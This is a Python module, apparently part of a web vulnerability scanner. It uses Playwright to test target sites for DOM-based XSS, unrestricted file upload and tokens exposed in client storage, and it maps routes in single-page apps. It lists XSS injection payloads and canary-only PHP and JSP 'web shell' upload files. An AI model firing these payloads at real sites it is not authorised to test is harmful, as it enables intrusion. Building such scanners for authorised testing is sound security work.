"""
Browser Automation Module — Playwright-based testing for JS-heavy apps.

Handles what httpx cannot:
  - DOM-based XSS (requires JavaScript execution)
  - Single Page Applications (React, Angular, Vue)
  - File upload testing
  - JavaScript-rendered content discovery
  - Visual verification of exploits
  - Cookie/localStorage inspection
  - CAPTCHA-aware navigation

Requires: pip install playwright && playwright install chromium
"""

import time
import re
from typing import Optional
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse

try:
    from playwright.sync_api import sync_playwright, Page, Browser, BrowserContext
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


@dataclass
class BrowserFinding:
    """A vulnerability found via browser testing."""
    vuln_type: str
    url: str
    param_name: str
    payload: str
    evidence: str
    severity: str
    screenshot_path: Optional[str] = None


class BrowserTester:
    """
    Playwright-based browser tester for vulnerabilities that require
    JavaScript execution or full browser context.

    Usage:
        tester = BrowserTester(headless=True)
        tester.start()
        tester.set_cookies("http://target", {"PHPSESSID": "abc"})
        findings = tester.test_dom_xss("http://target/page", "search")
        tester.stop()
    """

    def __init__(self, headless: bool = True, timeout: int = 10000):
        if not PLAYWRIGHT_AVAILABLE:
            raise ImportError(
                "Playwright is not installed. Run:\n"
                "  pip install playwright && playwright install chromium"
            )
        self.headless = headless
        self.timeout = timeout
        self.playwright = None
        self.browser: Optional[Browser] = None
        self.context: Optional[BrowserContext] = None
        self.page: Optional[Page] = None
        self.findings: list = []
        self._alert_messages: list = []

    def start(self):
        """Launch the browser."""
        self.playwright = sync_playwright().start()
        self.browser = self.playwright.chromium.launch(
            headless=self.headless,
            args=["--disable-web-security", "--no-sandbox"],
        )
        self.context = self.browser.new_context(
            ignore_https_errors=True,
            viewport={"width": 1280, "height": 720},
        )
        self.page = self.context.new_page()
        self.page.set_default_timeout(self.timeout)

        # Intercept alert/confirm/prompt dialogs (XSS proof)
        self.page.on("dialog", self._handle_dialog)

    def stop(self):
        """Close the browser."""
        if self.browser:
            self.browser.close()
        if self.playwright:
            self.playwright.stop()
        self.browser = None
        self.context = None
        self.page = None

    def _handle_dialog(self, dialog):
        """Capture JavaScript alert/confirm/prompt messages."""
        self._alert_messages.append({
            "type": dialog.type,
            "message": dialog.message,
            "timestamp": time.time(),
        })
        dialog.dismiss()

    def set_cookies(self, url: str, cookies: dict):
        """Set cookies in the browser context."""
        parsed = urlparse(url)
        cookie_list = []
        for name, value in cookies.items():
            cookie_list.append({
                "name": name,
                "value": str(value),
                "domain": parsed.hostname,
                "path": "/",
            })
        if cookie_list:
            self.context.add_cookies(cookie_list)

    def navigate(self, url: str, wait_for: str = "load") -> str:
        """Navigate to a URL and return the page content."""
        self.page.goto(url, wait_until=wait_for)
        return self.page.content()

    # ── DOM XSS Testing ──────────────────────────────────────────

    def test_dom_xss(self, url: str, param_name: str,
                     method: str = "GET") -> list:
        """
        Test for DOM-based XSS by injecting payloads and checking
        if JavaScript executes (via alert dialog interception).

        DOM XSS can't be detected by httpx because the payload is
        processed by client-side JavaScript, not reflected in HTML.
        """
        findings = []
        canary = f"DOMXSS_{int(time.time())}"

        # Payloads that trigger alert() — intercepted by dialog handler
        payloads = [
            f'<script>alert("{canary}")</script>',
            f'<img src=x onerror=alert("{canary}")>',
            f'"><script>alert("{canary}")</script>',
            f"'><script>alert('{canary}')</script>",
            f'javascript:alert("{canary}")',
            f'<svg onload=alert("{canary}")>',
            f'<body onload=alert("{canary}")>',
            f'{{{{constructor.constructor("alert(\'{canary}\')")()}}}}',  # Angular
            f'${{alert("{canary}")}}',  # Template literal injection
        ]

        for payload in payloads:
            self._alert_messages.clear()

            try:
                if method.upper() == "GET":
                    # Inject via URL parameter
                    sep = "&" if "?" in url else "?"
                    test_url = f"{url}{sep}{param_name}={payload}"
                    self.page.goto(test_url, wait_until="networkidle",
                                   timeout=self.timeout)
                else:
                    # Navigate to the page first, then fill the form
                    self.page.goto(url, wait_until="load")
                    # Try to find and fill the input
                    try:
                        input_sel = f'[name="{param_name}"]'
                        self.page.fill(input_sel, payload)
                        # Find and click the submit button
                        submit = self.page.query_selector(
                            'button[type="submit"], input[type="submit"]'
                        )
                        if submit:
                            submit.click()
                            self.page.wait_for_load_state("networkidle",
                                                          timeout=self.timeout)
                    except Exception:
                        continue

                # Wait a moment for JS to execute
                self.page.wait_for_timeout(500)

                # Check if our canary triggered an alert
                for alert in self._alert_messages:
                    if canary in alert["message"]:
                        finding = BrowserFinding(
                            vuln_type="DOM-based XSS",
                            url=url,
                            param_name=param_name,
                            payload=payload,
                            evidence=f"JavaScript alert fired with canary: {canary}",
                            severity="High",
                        )
                        findings.append(finding)
                        return findings  # One confirmed is enough

                # Also check if payload appears in DOM (potential XSS even if no alert)
                content = self.page.content()
                if canary in content and payload in content:
                    finding = BrowserFinding(
                        vuln_type="DOM-based XSS (Potential)",
                        url=url,
                        param_name=param_name,
                        payload=payload,
                        evidence=f"Payload with canary {canary} rendered in DOM unescaped",
                        severity="High",
                    )
                    findings.append(finding)
                    return findings

            except Exception:
                continue

        return findings

    # ── SPA Content Discovery ────────────────────────────────────

    def discover_spa_content(self, url: str) -> dict:
        """
        Discover content in Single Page Applications by:
        1. Waiting for JS to render
        2. Extracting all links/routes from the rendered DOM
        3. Finding hidden API calls via network interception
        """
        api_calls = []
        routes = set()

        # Intercept network requests to find API endpoints
        def handle_request(request):
            req_url = request.url
            if any(p in req_url for p in ["/api/", "/graphql", "/rest/",
                                           "/v1/", "/v2/", "/v3/"]):
                api_calls.append({
                    "url": req_url,
                    "method": request.method,
                    "headers": dict(request.headers),
                })

        self.page.on("request", handle_request)

        try:
            self.page.goto(url, wait_until="networkidle")

            # Wait for JS frameworks to render
            self.page.wait_for_timeout(2000)

            # Extract all links from rendered DOM
            content = self.page.content()
            links = self.page.eval_on_selector_all(
                "a[href]", "elements => elements.map(e => e.href)"
            )
            for link in links:
                if link and urlparse(link).netloc == urlparse(url).netloc:
                    routes.add(link)

            # Extract routes from JS frameworks
            # React Router, Vue Router, Angular Router
            js_routes = self.page.evaluate("""() => {
                const routes = new Set();

                // Check for React Router links
                document.querySelectorAll('[data-reactroot] a, [data-react] a').forEach(a => {
                    if (a.href) routes.add(a.href);
                });

                // Check for Angular routerLink
                document.querySelectorAll('[routerlink]').forEach(el => {
                    routes.add(window.location.origin + el.getAttribute('routerlink'));
                });

                // Check for Vue router-link
                document.querySelectorAll('router-link, [to]').forEach(el => {
                    const to = el.getAttribute('to');
                    if (to) routes.add(window.location.origin + to);
                });

                return Array.from(routes);
            }""")

            for route in js_routes:
                routes.add(route)

            # Extract forms from rendered DOM (may not be in initial HTML)
            forms = self.page.eval_on_selector_all("form", """forms => forms.map(f => ({
                action: f.action,
                method: f.method,
                inputs: Array.from(f.querySelectorAll('input, textarea, select')).map(i => ({
                    name: i.name,
                    type: i.type,
                    value: i.value,
                }))
            }))""")

        except Exception:
            pass

        self.page.remove_listener("request", handle_request)

        return {
            "rendered_routes": sorted(routes),
            "api_endpoints": api_calls,
            "js_forms": forms if 'forms' in dir() else [],
            "total_routes": len(routes),
            "total_api_calls": len(api_calls),
        }

    # ── File Upload Testing ──────────────────────────────────────

    def test_file_upload(self, url: str, file_input_name: str = "") -> list:
        """
        Test file upload for dangerous file type acceptance.
        Tries uploading web shells, polyglot files, etc.
        """
        import tempfile
        import os
        findings = []

        # Test files: (filename, content, description)
        test_files = [
            ("test.php", "<?php echo 'UPLOAD_CANARY_PHP'; ?>", "PHP web shell"),
            ("test.php.jpg", "<?php echo 'UPLOAD_CANARY_BYPASS'; ?>", "Extension bypass"),
            ("test.phtml", "<?php echo 'UPLOAD_CANARY_PHTML'; ?>", "Alternative PHP extension"),
            ("test.jsp", "<%= \"UPLOAD_CANARY_JSP\" %>", "JSP web shell"),
            ("test.html", "<script>alert('UPLOAD_CANARY_HTML')</script>", "HTML with script"),
            ("test.svg", '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'UPLOAD_CANARY_SVG\')"/>', "SVG with script"),
        ]

        try:
            self.page.goto(url, wait_until="load")

            # Find file input
            if file_input_name:
                file_input = self.page.query_selector(f'input[name="{file_input_name}"]')
            else:
                file_input = self.page.query_selector('input[type="file"]')

            if not file_input:
                return findings

            for filename, content, description in test_files:
                try:
                    # Create temp file
                    tmp_dir = tempfile.mkdtemp()
                    tmp_path = os.path.join(tmp_dir, filename)
                    with open(tmp_path, "w") as f:
                        f.write(content)

                    # Upload the file
                    self.page.goto(url, wait_until="load")
                    if file_input_name:
                        file_input = self.page.query_selector(
                            f'input[name="{file_input_name}"]')
                    else:
                        file_input = self.page.query_selector('input[type="file"]')

                    if file_input:
                        file_input.set_input_files(tmp_path)

                        # Click submit
                        submit = self.page.query_selector(
                            'button[type="submit"], input[type="submit"]'
                        )
                        if submit:
                            submit.click()
                            self.page.wait_for_load_state("load", timeout=self.timeout)

                        # Check if upload succeeded
                        response_text = self.page.content()
                        canary_marker = f"UPLOAD_CANARY_{filename.split('.')[-1].upper()}"

                        # Check for success indicators
                        success_indicators = [
                            "successfully uploaded", "upload complete",
                            "file uploaded", "success", filename,
                        ]

                        uploaded = any(
                            ind.lower() in response_text.lower()
                            for ind in success_indicators
                        )

                        if uploaded:
                            finding = BrowserFinding(
                                vuln_type="Unrestricted File Upload",
                                url=url,
                                param_name=file_input_name or "file",
                                payload=filename,
                                evidence=f"Server accepted upload of {description} ({filename})",
                                severity="Critical" if filename.endswith((".php", ".jsp")) else "High",
                            )
                            findings.append(finding)

                    # Cleanup
                    os.unlink(tmp_path)
                    os.rmdir(tmp_dir)

                except Exception:
                    continue

        except Exception:
            pass

        return findings

    # ── JavaScript/localStorage Inspection ────────────────────────

    def inspect_client_storage(self, url: str) -> dict:
        """
        Inspect client-side storage for sensitive data:
        - localStorage
        - sessionStorage
        - Cookies (including httpOnly status)
        """
        try:
            self.page.goto(url, wait_until="load")

            storage = self.page.evaluate("""() => {
                const result = {
                    localStorage: {},
                    sessionStorage: {},
                    cookies: document.cookie,
                };

                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    result.localStorage[key] = localStorage.getItem(key);
                }

                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    result.sessionStorage[key] = sessionStorage.getItem(key);
                }

                return result;
            }""")

            # Check for sensitive data in storage
            sensitive_patterns = [
                (r'eyJ[A-Za-z0-9_-]+\.eyJ', "JWT token"),
                (r'(?:api[_-]?key|secret|token|password)\s*[:=]', "Credentials/API key"),
                (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', "Email address"),
            ]

            issues = []
            all_values = (
                list(storage.get("localStorage", {}).values()) +
                list(storage.get("sessionStorage", {}).values())
            )
            for value in all_values:
                for pattern, desc in sensitive_patterns:
                    if re.search(pattern, str(value), re.IGNORECASE):
                        issues.append(f"{desc} found in client storage")
                        break

            storage["issues"] = issues
            return storage

        except Exception as e:
            return {"error": str(e)}

    # ── Convenience: Run all browser tests ────────────────────────

    def run_all_tests(self, url: str, attack_surface: list,
                      cookies: dict = None) -> list:
        """
        Run all browser-based tests against the attack surface.

        Args:
            url: Base URL
            attack_surface: List of {url, method, params} from crawler
            cookies: Session cookies to set

        Returns:
            List of BrowserFinding objects
        """
        all_findings = []

        if cookies:
            self.set_cookies(url, cookies)

        # 1. DOM XSS testing on all text parameters
        for entry in attack_surface:
            entry_url = entry.get("url", "")
            method = entry.get("method", "GET")
            params = entry.get("params", [])

            for param in params:
                param_lower = param.lower()
                # Test params likely to be reflected in DOM
                if any(h in param_lower for h in [
                    "name", "search", "q", "query", "input", "text",
                    "message", "comment", "title", "value", "default"
                ]):
                    findings = self.test_dom_xss(entry_url, param, method)
                    all_findings.extend(findings)

        # 2. File upload testing
        for entry in attack_surface:
            entry_url = entry.get("url", "")
            params = entry.get("params", [])
            if any(p.lower() in ("file", "upload", "uploaded", "attachment")
                   for p in params):
                findings = self.test_file_upload(entry_url)
                all_findings.extend(findings)

        # 3. Client storage inspection
        storage = self.inspect_client_storage(url)
        if storage.get("issues"):
            for issue in storage["issues"]:
                all_findings.append(BrowserFinding(
                    vuln_type="Sensitive Data in Client Storage",
                    url=url,
                    param_name="",
                    payload="N/A",
                    evidence=issue,
                    severity="Medium",
                ))

        # 4. SPA discovery (find hidden routes/APIs)
        spa_data = self.discover_spa_content(url)
        # Store for use by other scanners but don't report as finding
        self._spa_data = spa_data

        return all_findings

    def get_spa_data(self) -> dict:
        """Return SPA discovery data from last run_all_tests call."""
        return getattr(self, "_spa_data", {})


def check_playwright_installed() -> bool:
    """Check if Playwright is installed and chromium is available."""
    if not PLAYWRIGHT_AVAILABLE:
        return False
    try:
        pw = sync_playwright().start()
        browser = pw.chromium.launch(headless=True)
        browser.close()
        pw.stop()
        return True
    except Exception:
        return False
